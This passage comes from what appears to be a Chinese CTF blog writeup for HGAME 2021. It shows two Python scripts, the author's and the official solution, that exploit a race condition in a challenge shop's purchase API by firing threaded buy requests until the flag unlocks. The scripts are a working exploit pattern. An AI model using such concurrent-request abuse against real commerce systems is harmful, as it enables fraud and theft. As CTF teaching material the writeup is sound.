class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#注册并登入会话</span></span><br><span class="line">s = requests.session()</span><br><span class="line">register()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s.post(url=<span class="string">&quot;&#123;&#125;?m=login&quot;</span>.format(host),data=user)</span><br><span class="line">    print(<span class="string">&quot;Current userinfo:&quot;</span>)</span><br><span class="line">    print(user)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">&quot;Login failed&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    info =  json.loads(s.get(<span class="string">&quot;&#123;&#125;?m=getinfo&quot;</span>.format(host)).text)</span><br><span class="line">    money = info[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;money&#x27;</span>]</span><br><span class="line">    num = info[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;num&#x27;</span>]</span><br><span class="line">    print(<span class="string">&#x27;Current money:&#x27;</span> + str(money))</span><br><span class="line">    print(<span class="string">&#x27;Current num:&#x27;</span> + str(num))</span><br><span class="line">    print(<span class="string">&quot;===Waiting...===&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> num &gt;= <span class="number">52</span>:</span><br><span class="line">        res = json.loads(s.get(<span class="string">&quot;&#123;&#125;?m=getflag&quot;</span>.format(host)).text)</span><br><span class="line">        flag = res[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">        print(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        t = threading.Thread(target=buy)</span><br><span class="line">        t.start()</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
+
+<p>本题官方 exp（和往届那道题风格很像：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">host = <span class="string">&quot;https://birthday.liki.link/API/&quot;</span></span><br><span class="line">user = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">s = requests.session()</span><br><span class="line">s.post(url=<span class="string">&quot;&#123;&#125;?m=login&quot;</span>.format(host), data=user)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>():</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;amount&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;?m=buy&quot;</span>.format(host)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.post(url=url, data=data)</span><br><span class="line">    <span class="keyword">except</span>:print(<span class="string">&quot;Failed.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    info = json.loads(s.get(<span class="string">&quot;&#123;&#125;?m=getinfo&quot;</span>.format(host)).text)</span><br><span class="line">    money = info[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;money&#x27;</span>]</span><br><span class="line">    num = info[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;num&#x27;</span>]</span><br><span class="line">    print(money)</span><br><span class="line">    print(num)</span><br><span class="line">    <span class="keyword">if</span> num&gt;= <span class="number">52</span>:</span><br><span class="line">        print(s.get(<span class="string">&quot;&#123;&#125;?m=getflag&quot;</span>.format(host)).text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">21</span>):</span><br><span class="line">        t = threading.Thread(target=post)</span><br><span class="line">        t.start()</span><br><span class="line">        </span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h2 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h2><p>😅</p>
+<h2 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h2><p>😅</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/11/16/PHP%E5%B0%8F%E7%BB%93/" rel="prev" title="PHP小结">
+      <i class="fa fa-chevron-left"></i> PHP小结
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#HGAME-2021-Writeup-%E9%83%A8%E5%88%86"><span class="nav-number">1.</span> <span class="nav-text">HGAME 2021 Writeup (部分)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1"><span class="nav-number">1.1.</span> <span class="nav-text">Week1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web"><span class="nav-number">1.1.1.</span> <span class="nav-text">Web</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MISC"><span class="nav-number">1.1.2.</span> <span class="nav-text">MISC</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week2"><span class="nav-number">1.2.</span> <span class="nav-text">Week2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">Web</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week3"><span class="nav-number">1.3.</span> <span class="nav-text">Week3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week4"><span class="nav-number">1.4.</span> <span class="nav-text">Week4</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Casio3</p>
+  <div class="site-description" itemprop="description">Little trix</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <script
+  async
+  src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"
+></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Casio3</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
